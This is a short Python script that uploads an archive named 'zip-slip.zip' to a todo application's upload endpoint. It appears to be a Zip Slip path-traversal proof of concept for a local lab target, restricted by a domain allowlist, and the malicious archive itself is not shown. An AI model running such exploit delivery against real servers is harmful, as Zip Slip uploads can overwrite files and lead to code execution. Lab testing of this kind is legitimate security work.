import requests
import os
import sys
from urllib.parse import urlparse, urljoin

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ["http", "https"], result.netloc])
    except ValueError:
        return False

def is_allowed_domain(url, allowed_domains):
    try:
        result = urlparse(url)
        return result.netloc in allowed_domains
    except ValueError:
        return False

malicious_zip = os.path.join(os.path.dirname(__file__), 'zip-slip.zip')
input_url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8080'
url = urljoin(input_url, '/todo/upload.do.action')

# Validate the URL
if not is_valid_url(input_url):
    print("Invalid URL provided")
    sys.exit(1)

# Define allowed domains
allowed_domains = ['localhost:8080', 'example.com']

# Check if the domain is allowed
if not is_allowed_domain(input_url, allowed_domains):
    print("Domain not allowed")
    sys.exit(1)

files = {'upload': ('zip-slip.zip', open(malicious_zip, 'rb'), 'application/zip')}

# Make the request with a timeout to prevent hanging
try:
    response = requests.post(url, files=files, timeout=10)
    response.raise_for_status()
except requests.RequestException as e:
    print(f"Request failed: {e}")
